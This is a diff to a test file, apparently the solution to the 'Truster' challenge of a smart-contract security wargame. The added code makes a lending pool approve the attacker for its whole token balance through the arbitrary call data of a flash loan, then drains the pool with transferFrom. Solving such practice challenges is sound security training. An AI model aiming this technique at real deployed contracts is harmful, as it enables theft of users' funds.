@@ -22,7 +22,17 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Make the lender call the approve function on the token
+        approveSig = ethers.utils.id('approve(address,uint256)').substring(0, 10);
+        args = ethers.utils.defaultAbiCoder.encode(["address", "uint256"], [player.address, TOKENS_IN_POOL]).substring(2);
+
+        playerLender = await pool.connect(player);
+        await playerLender.flashLoan(0, player.address, token.address, approveSig + args);
+
+        playerToken = await token.connect(player);
+        console.log(await playerToken.allowance(pool.address, player.address));
+        await playerToken.transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
     });
 
     after(async function () {
